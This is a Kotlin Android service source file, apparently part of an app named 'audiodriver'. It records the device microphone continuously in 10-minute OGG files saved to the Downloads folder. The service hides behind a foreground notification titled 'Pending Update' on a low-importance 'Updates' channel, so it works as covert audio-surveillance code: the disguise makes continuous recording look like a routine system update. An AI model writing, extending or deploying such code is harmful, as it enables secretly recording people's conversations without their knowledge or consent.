package com.freedom.audiodriver.service

import android.Manifest
import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.freedom.audiodriver.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File


class MainService : Service() {

    val sampleRate: Int = 48000
    val bitRate: Int = 64000

    var isRecording: Boolean = false

    companion object {
        const val CHANNEL_ID = "UpdatesChannel"

        fun isServiceRunningInForeground(context: Context, serviceClass: Class<*>): Boolean {
            val manager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
            for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                if (serviceClass.name == service.service.className) {
                    if (service.foreground) {
                        return true
                    }
                }
            }
            return false
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            Actions.START.name -> start()
            Actions.STOP.name -> stop()
        }
        return super.onStartCommand(intent, flags, startId)
    }

    private fun start() {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Pending Update")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()

        startForeground(1, notification)

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            stopSelf()
            return
        }

        if (
            Build.VERSION.SDK_INT < Build.VERSION_CODES.S
        ) {
            stopSelf()
            return
        }

        isRecording = true
        CoroutineScope(Dispatchers.IO).launch {
            while (isRecording) {
                val mediaRecorder = MediaRecorder(this@MainService).apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.OGG) // Requires API 29+
                    setAudioEncoder(MediaRecorder.AudioEncoder.OPUS)
                    setAudioSamplingRate(sampleRate)
                    setAudioEncodingBitRate(bitRate)
                    setMaxDuration(600000) // 10 minutes in milliseconds

                    val downloadsDir = Environment.getExternalStoragePublicDirectory(
                        Environment.DIRECTORY_DOWNLOADS
                    )
                    val fileName = "audio-${System.currentTimeMillis()}.ogg"
                    val outputFile = File(downloadsDir, fileName)
                    setOutputFile(outputFile.absolutePath)

                    prepare()
                    start()
                }

                // Wait for 10 minutes or until stopped
                var elapsedTime = 0
                while (isRecording && elapsedTime < 600000) {
                    Thread.sleep(1000)
                    elapsedTime += 1000
                }

                mediaRecorder.apply {
                    stop()
                    reset()
                    release()
                }

                if (!isRecording) break
            }
            stopSelf()
        }
    }

    private fun stop() {
        isRecording = false
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Updates",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    enum class Actions {
        START,
        STOP
    }
}